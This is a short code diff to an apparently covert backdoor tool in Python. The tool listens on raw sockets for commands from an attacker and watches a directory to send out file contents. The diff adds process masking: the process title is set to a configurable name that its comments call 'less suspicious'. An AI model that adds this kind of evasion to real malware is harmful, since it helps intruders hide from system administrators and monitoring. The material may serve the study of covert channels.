@@ -39,6 +39,7 @@ import binascii
 import pyinotify
 import parseConfig
 import time
+import setproctitle #Used for process masking
 
 # Parse configuration parameters from configuration file immediately upon running.
 localIP = parseConfig.localIP
@@ -51,6 +52,7 @@ authentication = parseConfig.authentication
 clientIP = parseConfig.clientIP
 monitorDir = parseConfig.monitorDir
 protocol = parseConfig.sendProtocol
+processName = parseConfig.processName
 messages = []
 
 
@@ -631,6 +633,9 @@ def fileToBits(filePath):
 --                                     MAIN                                    --
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 if __name__ == "__main__":
+    # Mask the process name
+    #Set process title to something less suspicious
+    setproctitle.setproctitle(processName)
     # Two processes will be created.
     # One which listens for commands on raw sockets from the attacker
     commandSniffProcess = Process(target=sniffing)
